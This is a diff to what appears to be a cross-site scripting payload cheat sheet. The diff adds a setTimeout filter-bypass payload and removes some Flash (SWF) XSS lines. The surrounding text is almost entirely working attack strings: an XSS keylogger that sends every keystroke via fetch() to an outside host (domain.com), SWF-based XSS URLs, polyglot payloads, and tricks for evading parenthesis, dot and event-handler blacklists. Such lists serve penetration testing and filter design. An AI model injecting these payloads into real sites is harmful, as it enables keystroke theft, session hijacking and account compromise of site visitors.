@@ -31,7 +31,7 @@ fclose($fp);
 
 Keylogger for XSS
 
-```html
+```javascript
 <img src=x onerror='document.onkeypress=function(e){fetch("http://domain.com?k="+String.fromCharCode(e.which))},this.remove();'>
 ```
 
@@ -238,19 +238,13 @@ XSS in SWF flash application
 Browsers other than IE: http://0me.me/demo/xss/xssproject.swf?js=alert(document.domain);
 IE8: http://0me.me/demo/xss/xssproject.swf?js=try{alert(document.domain)}catch(e){ window.open(‘?js=history.go(-1)’,’_self’);}
 IE9: http://0me.me/demo/xss/xssproject.swf?js=w=window.open(‘invalidfileinvalidfileinvalidfile’,’target’);setTimeout(‘alert(w.document.location);w.close();’,1);
-
-InsecureFlashFile.swf
-location to url: InsecureFlashFile.swf?a=location&c=http://www.google.com/
-open url to new window: InsecureFlashFile.swf?a=open&c=http://www.google.com/
-http request to url: InsecureFlashFile.swf?a=get&c=http://www.google.com/
-eval js codz: InsecureFlashFile.swf?a=eval&c=alert(document.domain)
 ```
 
 more payloads in ./files
 
 XSS in SWF flash application
 
-```javascript
+```
 flashmediaelement.swf?jsinitfunctio%gn=alert`1`
 flashmediaelement.swf?jsinitfunctio%25gn=alert(1)
 ZeroClipboard.swf?id=\"))} catch(e) {alert(1);}//&width=1000&height=1000
@@ -299,7 +293,7 @@ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</
 Polyglot XSS - Ashar Javed
 
 ```javascript
- ">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http: //i.imgur.com/P8mL8.jpg">
+">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http: //i.imgur.com/P8mL8.jpg">
 ```
 
 Polyglot XSS - Mathias Karlsson
@@ -407,10 +401,11 @@ Bypass dot filter
 <script>window['alert'](document['domain'])<script>
 ```
 
-Bypass parenthesis for string - Firefox
+Bypass parenthesis for string - Firefox/Opera
 
 ```javascript
 alert`1`
+setTimeout`alert\u0028document.domain\u0029`;
 ```
 
 Bypass onxxxx= blacklist
@@ -511,6 +506,7 @@ top['al\x65rt'](9);
 open('java'+'script:ale'+'rt(11)');
 location='javascript:ale'+'rt(12)';
 
+setTimeout`alert\u0028document.domain\u0029`;
 setTimeout('ale'+'rt(2)');
 setInterval('ale'+'rt(10)');
 Set.constructor('ale'+'rt(13)')();
